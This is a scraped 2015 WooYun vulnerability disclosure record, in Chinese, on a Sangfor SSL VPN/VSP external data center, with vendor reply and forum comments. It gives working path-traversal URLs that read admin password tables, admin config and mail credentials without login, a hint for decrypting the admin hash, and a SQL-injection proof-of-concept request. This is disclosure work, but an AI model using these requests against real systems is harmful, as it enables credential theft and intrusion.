{"id": 34948, "wybug_id": "wooyun-2015-098982", "wybug_title": "深信服SSL VPN&amp;VSP外置数据中心任意文件下载和SQL注射漏洞", "wybug_corp": "深信服", "wybug_author": "f4ckbaidu", "wybug_date": "2015-03-01 20:50", "wybug_open_date": "2015-05-31 12:00", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向公众公开  简要描述： 我来促使研发哥加班了 详细说明：  一、任意文件下载问题文件：\\src\\module\\opt\\downloadSecFile.php\n<?php\t// 解码$url = rawurldecode($_REQUEST['url']);\t// 处理浏览器自动解码$name = rawurlencode($_REQUEST['name']);$dirArr = explode(\"/\", $url);if(!is_array($dirArr) || strcasecmp(\"UploadFiles\", $dirArr[1]) != 0 || in_array(\"..\", $dirArr)){\theader(\"Content-type: text/html; charset=utf-8\");\techo \"下载URL非法！\";\texit;}// 提示下载文件header(\"Content-Disposition:attachment;filename=$name\");header(\"Expires: 0\");header(\"Content-Type: application/force-download\");header(\"Content-Type: application/octet-stream\");header(\"Content-Type: application/download\");header(\"Content-Description: File Transfer\"); \t // 读取下载的文件$root = $_SERVER['DOCUMENT_ROOT'];$path = $root.$url;@readfile($path);?>\n没有include init.php，无需登录可以直接访问问题代码：\n$dirArr = explode(\"/\", $url);if(!is_array($dirArr) || strcasecmp(\"UploadFiles\", $dirArr[1]) != 0 || in_array(\"..\", $dirArr))\n呵呵，windows下穿越目录可以这么干：\nC:\\Program Files>cd ..\\C:\\>\n\n\n轻松bypass，可以用来读取服务器上任意文件（当然仅限于安装目录所在盘符下的文件）比如说：1、脱裤子\nhttps://IP/src/module/opt/downloadSecFile.php?url=/UploadFiles/..\\./..\\./mysql/data/sinforglobaldb/sys_adt.MYD\nsys_adt.MYD里保存了系统管理员帐号密码，参考之前发的漏洞： WooYun: 深信服VSP外置数据中心getshell 红框部分合并就是Admin帐号加密后的密码，去掉最后一位，key为tjf解密如下：\n\n\n\n2、读取global_admin.ini直接登录参考漏洞： WooYun: 深信服SSL VPN外置数据中心敏感信息泄漏&SQL注入漏洞可导致getshell \nhttps://IP/src/module/opt/downloadSecFile.php?url=/UploadFiles/..\\/global_admin.ini\n\n\n3、获取邮箱帐号密码\nhttps://IP/src/module/opt/downloadSecFile.php?url=/UploadFiles/..\\/src/inc/conf/mailSvr.conf\n\n\n二、SQL注入（insert into类型，需要登录）问题代码在DBMantain.class.php里：\nprivate function DBBackup($nodeid, $desc=null)        {\t\t\tif(!is_numeric($nodeid))\t\t\t{\t\t\t\treturn false;\t\t\t}\t\t\tif(check_db_busy())\t\t\t{\t\t\t\t$this->errNo = CAN_NOT_RESTART_MYSQL;\t\t\t\treturn false;\t\t\t}            $svr    = new devservices();             $nodeObj= new NodeMantain();                        /* 检测节点是否存在 */            if( ! $nodeObj->chkDbIntegraty($nodeid) )            {                $this->errNo = ERR_MISS_OR_EXISTS_NODEID;                return false;            }            /* 备份目录不存在则创建 */            $dbpath = $this->GetNodeDBPath($nodeid);    // 得到数据库目录\t\t\tif(false === $dbpath)\t\t\t{\t\t\t\treturn false;\t\t\t}            if( ! file_exists($this->backpath) )\t//从配置文件里读出来的是GBK，编码正常            {                if( ! createFolder($this->backpath, TRUE) )                {                    $this->errNo = CREATE_DIR_FAILURE;                    return false;                }            }                        /* 计算可用空间 */            //$this->backpath = iconv (\"UTF-8\", \"GBK\", $this->backpath );//由于NT内核，在接口上用的是GBK的字符集，所以得转成GBK            if( disk_free_space($this->backpath) < $this->dirSpace($dbpath) )            {                $this->errNo = NO_ENOUGH_SPACE;                return false;            }                        /* 备份文件含路径 */            $backname = $this->createBackName($nodeid);            $backpath = dirTrans($this->backpath.'/'.$backname);\t\t\t\t\t\t/* 插入备份信息记录 */            $this->conn->OpenDb();\t\t\t$dbmd5 = $this->dbMD5($backpath);\t\t\t\t//计算MD5时路径为GBK编码\t\t\t$backpath = iconv (\"GBK\",\"UTF-8\", $backpath );\t//转成UTF-8存到数据库中            $time = date(\"Y-m-d h:i:s\");               $sql = \"INSERT INTO db_backup(Descrption, backname, BackPath, NodeId, Md5digest, time)                     VALUES('$desc', '$backname', '$backpath', $nodeid, '$dbmd5', '$time')\";            if( ! $this->conn->query_unbuffered($sql) )            {                $this->errNo = DB_INSERT_FAILURE;                return false;            }            ......省略        }\n$desc没有过滤可引入单引号形成insert型注入，POC如下：\nPOST https://192.168.222.101/src/module/opt/optsysconf.php?config_type=6&rnd=0.33210583170875907 HTTP/1.1Host: 192.168.222.101Connection: keep-aliveContent-Length: 29Origin: https://192.168.222.101User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Referer: https://192.168.222.101/src/module/view/datalogbackup.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: lang_cookie=zh_CN; lang_cookie=zh_CN; PHPSESSID=kkdi4f3r6iq7dkesnjji4hgbf5id=1&descrption=ffffffffffff' <--单引号在此\n\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-03-02 11:59 厂商回复： 感谢白帽子提出的问题！经过内部验证：（1）此外置数据中心主要用于存放VPN的操作日志，不涉及VPN的权限安全问题；（2）外置数据中心基本上部署在客户内网，外网无法访问该数据中心，因此该漏洞较难利用。综合考虑以上两点内容，我们将漏洞降为中级。我们的工程师正在紧急修复该漏洞，近期将发布补丁包。启动了自动更新功能的客户可通过在线升级的方式自动修复此漏洞，另外，我们的客服部门也将发布公告推动更新。  最新状态： 2015-03-02：得知漏洞信息后，深信服工程师已第一时间对SSL产品线全部版本及其外置数据中心进行排查， 此隐患只存在于外置数据中心，不会对SSL VPN设备自身的稳定性和安全性造成任何影响。并且外置数据中心一般部署于内网，无法通过互联网进行访问，因此来自互联网利用此漏洞进行攻击威胁的可行性较低。而未安装使用外置数据中心的设备，完全不受此漏洞影响。特此声明。  ", "replys": "漏洞评价：\n评论\n     2015-03-01 22:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  目测洞主好人    \n     2015-03-02 00:19 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  要火，一大批设备要被爆菊了    \n     2015-03-02 00:23 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @Master 外置dc不是设备本身，手上没设备可分析    \n     2015-03-02 00:26 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @xsser 你猜对了，经常被妹纸发好人卡的屌丝无奈飘过～    \n     2015-03-05 15:24 |    \t\t孔卡 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:12        | 我已经过了那个餐桌上只有一条鸡腿就一定能...)\t\t \n  外置数据中心源码是深信服的  可以全他们官网下载 这个没有啥授权问题    \n     2015-03-05 22:50 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  @f4ckbaidu 嘿嘿，rank等待确认    \n     2015-03-06 10:24 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  @f4ckbaidu 我看到标题一个 & 以为一大波VPN要被爆菊呢。坐等公开    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}